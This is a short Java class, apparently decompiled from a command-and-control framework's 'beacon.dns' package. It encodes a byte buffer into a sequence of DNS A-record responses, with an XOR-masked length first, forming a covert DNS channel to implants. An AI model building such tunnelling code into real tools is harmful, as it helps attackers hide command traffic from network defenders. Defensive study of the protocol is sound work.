package beacon.dns;

import common.MudgeSanity;
import dns.DNSServer;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;

public class SendConversationA extends SendConversation {
    protected DataInputStream readme = null;

    public SendConversationA(String string1, String string2, long l) {
        super(string1, string2, l);
    }

    public boolean started() {
        return (this.readme != null);
    }

    public DNSServer.Response start(byte[] arrby) {
        this.readme = new DataInputStream(new ByteArrayInputStream(arrby));
        return DNSServer.A(arrby.length ^ this.idlemask);
    }

    public DNSServer.Response next() {
        try {
            return DNSServer.A(this.readme.readInt());
        } catch (IOException iOException) {
            MudgeSanity.logException("send, next", iOException, false);
            return DNSServer.A(0L);
        }
    }

    public boolean isComplete() {
        try {
            if (this.readme == null)
                return true;
            if (this.readme.available() == 0) {
                this.readme.close();
                return true;
            }
            return false;
        } catch (IOException iOException) {
            MudgeSanity.logException("isComplete", iOException, false);
            return true;
        }
    }
}
